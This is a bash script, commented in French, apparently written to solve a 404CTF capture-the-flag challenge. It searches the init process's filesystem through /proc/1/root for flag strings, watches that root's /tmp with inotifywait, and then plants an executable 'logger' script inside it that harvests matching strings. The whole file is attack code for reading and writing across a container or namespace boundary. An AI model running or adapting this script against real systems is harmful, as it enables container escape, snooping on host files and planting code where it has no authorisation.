#!/bin/bash

echo "[*] 🎯 Démarrage du flag_hunt_combined.sh"

# 1. Recherche directe dans les fichiers accessibles contenant un flag
echo "[1/3] 🔍 Recherche directe dans les fichiers lisibles contenant '404CTF{...}'..."
echo "[33%] Recherche en cours..."
flag_found=$(grep -rEo '404CTF\{[^}]+' /proc/1/root 2>/dev/null | head -n 1)

if [[ -n "$flag_found" ]]; then
  echo "[✔] Flag trouvé directement : $flag_found"
  mkdir -p /tmp/flag_detect
  echo "$flag_found" > /tmp/flag_detect/final_flag.txt
  exit 0
else
  echo "[33%] Aucun flag trouvé lors de la recherche directe."
fi

# 2. Watcher passif sur 15 secondes
echo "[2/3] 🛍 Watcher actif pendant 15 secondes sur les fichiers volatils..."
echo "[66%] Surveillance en cours..."

mkdir -p /tmp/flag_detect
logfile="/tmp/flag_detect/flag_passive.log"
rm -f "$logfile"

inotifywait -e create,modify,open,access -r /proc/1/root/tmp --format '%w%f' -t 15 2>/dev/null | while read f; do
  if grep -qE '404CTF\{[^}]+' "$f" 2>/dev/null; then
    echo "[✔] Flag détecté passivement dans : $f"
    grep -Eo '404CTF\{[^}]+' "$f" | tee "$logfile"
    echo "[FLAG] $(cat "$logfile")" > /tmp/flag_detect/final_flag.txt
    exit 0
  fi
done

echo "[66%] Aucun flag détecté durant la surveillance active."

# 3. Injection d’un script logger passif
echo "[3/3] 🔒 Injection d’un logger passif dans /proc/1/root/tmp..."
cat <<EOF > /proc/1/root/tmp/logger.sh
#!/bin/bash
for f in /tmp/*.log /tmp/*.txt; do
  grep -Eo '404CTF\{[^}]+' "\$f" >> /tmp/flag_detect/final_flag.txt 2>/dev/null
done
EOF
chmod +x /proc/1/root/tmp/logger.sh
echo "[100%] ✅ Terminaison du script. Logger injecté."

echo "[*] 📂 Flag détecté (si trouvé) sauvegardé dans : /tmp/flag_detect/final_flag.txt"
